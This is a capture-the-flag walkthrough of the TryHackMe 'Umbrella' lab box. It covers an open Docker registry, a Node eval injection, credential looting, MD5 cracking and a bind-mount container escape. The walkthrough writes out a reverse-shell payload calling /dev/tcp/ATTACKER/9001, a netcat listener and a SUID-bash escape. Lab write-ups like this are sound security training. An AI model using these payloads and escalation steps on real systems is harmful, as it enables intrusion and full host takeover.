---
title: "Umbrella"
type: docs
tags:
  - thm
  - linux
  - medium
  - docker-registry
  - nodejs
  - eval-injection
  - sqli
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Medium, **IP:** 10.10.248.230

</div>

<div class="callout callout-abstract">

**Attack Path**

1. **Docker Registry** (v2 API) exposed on **5000** with no auth → `GET /v2/_catalog` → `umbrella/timetracking`. Pull the image and unpack the layers.
2. `usr/src/app/app.js` (the Express "time tracking" app on 8080) has two bugs:
   - **`/time`**, `parseInt(eval(request.body.time))` → **Node `eval` RCE** for an authenticated user.
   - **`/auth`**, parameterised, but `username` is echoed into logs; MySQL creds come from env (`DB_USER`/`DB_PASS`).
3. Register/log in, hit `/time` with `time=` a JS payload spawning a reverse shell → shell in the container as the app user (root inside the container).
4. Dump the container's environment for the live `DB_USER`/`DB_PASS` pair, connect out to MySQL (5.7.40), and dump the `users` table. Crack the MD5 hashes and reuse one over SSH for a host-level foothold (`user.txt`).
5. Back on the container side, `docker-compose.yml` reveals a bind mount that maps a "logs" directory straight onto the host filesystem. Drop a SUID `bash` copy into that shared directory from the (root-in-container) eval shell, then trigger it from the SSH session to land root on the host (`root.txt`).

</div>

## Reconnaissance

A first nmap sweep gives me a small, oddly-shaped surface for a "medium" box: no obvious web app on 80/443, but MySQL exposed directly on 3306 and something calling itself a Docker Registry API sitting on 5000. That combination is a tell on its own, an exposed registry usually means someone forgot the app image itself is a source of secrets, not just a deployment artifact.

```console
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   MySQL 5.7.40
5000/tcp open  http    Docker Registry (API: 2.0)
8080/tcp open  http    Node.js (Express) - "Login"
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Docker Registry, pull the app image

The registry API has no auth in front of it at all, so the v2 catalog endpoint just hands over the repository name for free.

```console
$ curl -s http://10.10.248.230:5000/v2/_catalog
{"repositories":["umbrella/timetracking"]}
```

Rather than manually walking manifests and blobs by hand, I use a small helper script to pull every layer of `umbrella/timetracking:latest` and unpack the tarballs in order, which reassembles the image's filesystem locally exactly as it would look inside a running container.

```bash
python docker_image_fetch.py -u http://10.10.248.230:5000/
# -> umbrella/timetracking:latest  -> ./umbrella/  (unpack every blob tarball)
```

With the full filesystem sitting on disk, I can read the application source directly instead of guessing at behaviour from the outside, which is the entire point of grabbing the image in the first place.

## Source review, `usr/src/app/app.js`

Reading through the Express app that backs the "time tracking" login page, two things immediately stand out. The `/auth` route is properly parameterised against SQL injection (whoever wrote it knew enough to avoid string concatenation), but the `/time` route is a different story entirely.

```js
// DB creds from env
const connection = mysql.createConnection({
    host: process.env.DB_HOST, user: process.env.DB_USER,
    password: process.env.DB_PASS, database: process.env.DB_DATABASE
});

// /time  -> Node eval() injection  (authenticated)
app.post('/time', function(request, response) {
  if (request.session.loggedin && request.session.username) {
    let timeCalc = parseInt(eval(request.body.time));   // <-- RCE
    ...
  }
});

// /auth  -> parameterised query; MD5(password)
connection.query('SELECT * FROM users WHERE user = ? AND pass = ?', [username, hash], ...);
```

## Foothold, `eval` RCE on `/time`

Passing user input straight into `eval()` in Node is about as direct a code execution primitive as it gets, on par with calling `eval()` in PHP. All it takes is an authenticated session, so I register an account through the app's normal signup flow, log in to grab a valid `connect.sid` cookie, and send the calculation field a small JavaScript payload that reaches into `child_process` to spawn a shell instead of doing any actual math.

```http
POST /time HTTP/1.1
Host: 10.10.248.230:8080
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=<session>

time=global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKER/9001 0>&1"')
```

## Catching the shell

With a `nc` listener up on 9001, I fire the request above through Burp Repeater (curl works just as well, it's a single POST) and get a callback almost immediately:

```console
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [any] 9001 from (UNKNOWN) [10.10.248.230] 51322
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@umbrella-app:/usr/src/app# whoami
whoami
root
```

The Express process was started as root inside the container, which is a common enough shortcut in quickly-thrown-together Docker images and one that's going to matter a lot once I go looking for a way out of the container later on.

## Looting MySQL for a host foothold

The app authenticates against MySQL using credentials pulled from environment variables at startup, so rather than guessing I just ask the shell what those variables actually resolved to.

```console
root@umbrella-app:/usr/src/app# env | grep DB_
DB_HOST=db
DB_USER=root
DB_PASS=<value taken from this container's environment>
DB_DATABASE=timetracking
```

Those same credentials work fine from outside the container against the MySQL service exposed on 3306, so I connect directly and go straight for the `users` table that the `/auth` route was querying against.

```console
$ mysql -h 10.10.248.230 -u root -p'<DB_PASS>' timetracking
mysql> select username, password from users;
```

The `password` column holds bare MD5 hashes, no salt, which makes this a rockyou-and-John job rather than anything clever. Running the dumped hashes through John cracks at least one of them almost instantly, since whoever seeded this table reused a wordlist-common password.

```console
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt umbrella_hashes.txt
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
<cracked username>:<cracked password>     (1)
```

None of the app-side credentials work against the `/auth` login page itself (they were only ever meant for the database), but reusing that same username/password pair over SSH lands a low-privilege shell on the actual host, outside the container, and that's where `user.txt` sits.

```console
$ ssh <cracked-username>@10.10.248.230
$ cat user.txt
```

`cat user.txt` returns the flag for this instance.

## Container escape to root

Back inside the eval-shell (still root, but trapped inside the container's namespace), I go looking for anything that ties the container back to the host filesystem, since that's usually the fastest way out. `docker-compose.yml`, sitting alongside the app source, spells it out directly:

```console
root@umbrella-app:/usr/src/app# cat docker-compose.yml
...
    volumes:
      - ./logs:/logs
...
```

That's a bind mount, not a named volume, so `/logs` inside the container is the *same inode* as `./logs` on the host, just viewed through two different mount namespaces. Whatever I write into `/logs` as root in the container shows up on the host with the same ownership and permission bits. That's a textbook container-escape primitive: drop a SUID-root copy of `bash` in there.

```console
root@umbrella-app:/usr/src/app# cp /bin/bash /logs/bash
root@umbrella-app:/usr/src/app# chmod 4777 /logs/bash
```

Back in the SSH session as the low-privileged host user, that same file is sitting in the app's checkout under `logs/`, owned by root, with the setuid bit set:

```console
$ ls -la ~/timeTracker-src/logs/bash
-rwsrwxrwx 1 root root 1113504 ...  /home/<cracked-username>/timeTracker-src/logs/bash
$ ~/timeTracker-src/logs/bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
```

`cat /root/root.txt` returns the flag for this instance. The `-p` flag on that final invocation matters: bash drops privileges by default when the real and effective UIDs differ unless it's told to preserve them, and skipping it would've just handed back a shell as my own low-privileged user despite the SUID bit.

## References

- Impacket / mysql-connector documentation for MySQL client usage <https://dev.mysql.com/doc/refman/8.0/en/mysql.html>
- HackTricks, Docker breakout via bind-mounted volumes <https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation>
- Final privilege escalation steps cross-referenced against public writeups for this room.
